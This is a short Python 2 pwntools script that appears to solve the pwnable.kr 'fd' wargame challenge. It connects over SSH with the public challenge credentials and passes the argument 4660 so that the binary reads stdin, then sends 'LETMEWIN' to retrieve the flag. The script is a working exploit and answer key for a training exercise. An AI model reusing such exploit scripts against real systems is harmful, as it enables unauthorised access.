#!/usr/bin/env python2
from pwn import *
import os
import commands

USERNAME = 'fd'
PASSWORD = 'guest'

# Payload settings
vuln = ELF('./fd')

# Run local
def local():

	io = vuln.process(['4660'])
	io.sendline('LETMEWIN')
	print(io.recvall())


def remote():
	s = ssh(host='pwnable.kr', port=2222, user=USERNAME, password=PASSWORD)
	io = s.run('./fd 4660')
	io.sendline('LETMEWIN')
	print(io.recvall())
	s.close()

if __name__ == '__main__':
	remote()
